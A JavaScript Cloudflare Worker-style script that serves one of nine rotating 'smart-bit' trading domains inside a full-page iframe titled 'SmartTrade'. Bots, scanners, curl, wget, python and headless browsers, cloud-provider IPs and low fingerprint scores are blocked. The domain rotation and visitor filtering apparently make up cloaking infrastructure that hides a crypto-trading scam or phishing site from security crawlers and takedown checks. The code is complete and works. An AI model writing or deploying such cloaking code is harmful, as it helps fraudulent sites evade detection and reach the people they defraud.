addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

const TARGETS = [
  'https://www.twsmarts.com',
  'https://www.smart-std.com',
  'https://www.twsmart-td.com',
  'https://www.smart-bittw.com',
  'https://www.smart-bitshoptw.com',
  'https://www.smart-twbitshop.com',
  'https://www.smart-twbit.com',
  'https://www.smart-bitshop.com',
  'https://www.smart-twbitcc.com',
];

const BLACKLIST_IPS = ["1.2.3.4", "223.104.196.22"];
const WHITELIST_IPS = ["203.0.113.50"];
const ALLOWED_PATHS = new Set(["/", "/forward"]);

async function checkTargetHealth(targetUrl) {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    
    const response = await fetch(targetUrl, {
      method: "HEAD",
      signal: controller.signal,
      redirect: "manual",
    });
    
    clearTimeout(timeoutId);
    return response.ok || response.status === 301 || response.status === 302;
  } catch (e) {
    return false;
  }
}

async function getHealthyTarget() {
  for (const target of TARGETS) {
    const isHealthy = await checkTargetHealth(target);
    if (isHealthy) {
      return target;
    }
  }
  return TARGETS[0];
}

async function handleRequest(request) {
  const url = new URL(request.url);

  if (request.method === "OPTIONS") {
    return createPreflightResponse(request);
  }

  if (url.pathname === "/favicon.ico") {
    return withCors(
      new Response(null, {
        status: 204,
        headers: {
          "cache-control": "public, max-age=86400",
        },
      }),
      request
    );
  }

  if (request.method !== "GET") {
    return withCors(
      new Response("Method Not Allowed", {
        status: 405,
        headers: {
          "content-type": "text/plain; charset=UTF-8",
          allow: "GET, OPTIONS",
        },
      }),
      request
    );
  }

  if (!ALLOWED_PATHS.has(url.pathname)) {
    return withCors(
      new Response("Not Found", {
        status: 404,
        headers: {
          "content-type": "text/plain; charset=UTF-8",
        },
      }),
      request
    );
  }

  try {
    const fp = url.searchParams.get("fp") || "";
    const ip = request.headers.get("cf-connecting-ip") || "";
    const ua = request.headers.get("user-agent") || "";
    const referer = request.headers.get("referer") || "";

    if (WHITELIST_IPS.includes(ip)) {
      const target = await getHealthyTarget();
      return renderIframe(target, request);
    }

    if (BLACKLIST_IPS.includes(ip)) {
      return block(request);
    }

    if (/bot|spider|crawler|curl|wget|phantom|headless|python|node|scrapy/i.test(ua)) {
      return block(request);
    }

    if (!referer && ua.length < 10) {
      return block(request);
    }

    const score = computeScore(fp, ip, ua);
    if (score < 70) {
      return block(request);
    }

    const target = await getHealthyTarget();
    await delay(300 + Math.random() * 600);

    return renderIframe(target, request);
  } catch (error) {
    return withCors(
      new Response("Internal Server Error", {
        status: 500,
        headers: {
          "content-type": "text/plain; charset=UTF-8",
          "cache-control": "no-store",
        },
      }),
      request
    );
  }
}

function createPreflightResponse(request) {
  return withCors(
    new Response(null, {
      status: 204,
      headers: {
        "access-control-allow-methods": "GET, OPTIONS",
        "access-control-allow-headers": request.headers.get("access-control-request-headers") || "*",
        "access-control-max-age": "86400",
        "cache-control": "no-store",
      },
    }),
    request
  );
}

function withCors(response, request) {
  const headers = new Headers(response.headers);
  const origin = request.headers.get("origin");

  headers.set("access-control-allow-origin", origin || "*");
  headers.set("access-control-allow-methods", "GET, OPTIONS");
  headers.set(
    "access-control-allow-headers",
    request.headers.get("access-control-request-headers") || "*"
  );
  headers.set("vary", "Origin");

  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers,
  });
}

function renderIframe(target, request) {
  const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SmartTrade</title>
<style>
html,body{
margin:0;
padding:0;
height:100%;
overflow:hidden;
background:#fff;
}
iframe{
border:0;
width:100%;
height:100%;
}
</style>
</head>
<body>
<iframe src="${target}" referrerpolicy="no-referrer"></iframe>
</body>
</html>`;

  return withCors(
    new Response(html, {
      headers: {
        "content-type": "text/html; charset=UTF-8",
        "cache-control": "no-store",
      },
    }),
    request
  );
}

function computeScore(fp, ip, ua) {
  let score = 0;

  if (fp && fp.length > 50) score += 50;
  if (!/bot|headless|phantom|selenium/i.test(fp)) score += 20;
  if (!/aws|google|azure/i.test(ip)) score += 15;
  if (ua && ua.length > 20) score += 15;

  return score;
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function block(request) {
  return withCors(
    new Response("Access Denied", {
      status: 403,
      headers: {
        "content-type": "text/plain; charset=UTF-8",
        "cache-control": "no-store",
      },
    }),
    request
  );
}
